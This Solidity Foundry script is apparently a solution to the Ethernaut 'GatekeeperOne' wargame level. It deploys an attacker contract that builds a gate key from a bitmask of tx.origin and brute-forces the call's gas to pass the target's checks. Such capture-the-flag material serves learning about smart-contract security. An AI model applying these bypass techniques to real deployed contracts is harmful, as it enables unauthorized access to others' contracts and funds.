// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { GatekeeperOne } from "../src/level13.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice tx.origin, gas manipulation, bitwise & casting
contract Level13Solution is Script {
    GatekeeperOne level = GatekeeperOne(0x98f06560E30f11690Fbbf4D796Bd60700116B16E);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        
        new Attacker(level);
    
        vm.stopBroadcast();
    }
}

contract Attacker {
    GatekeeperOne level;

    constructor(GatekeeperOne _level) {
        level = _level;
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0x000000FF0000FFFF);

        
        for(uint256 i = 0; i<300; i++){
            (bool success, ) = address(level).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(success){
                console.log(success);
                console.log("gas: ", gasleft()% 8191);
                console.log("entrant: ", level.entrant());
                break;
            }
        } 
    }
}
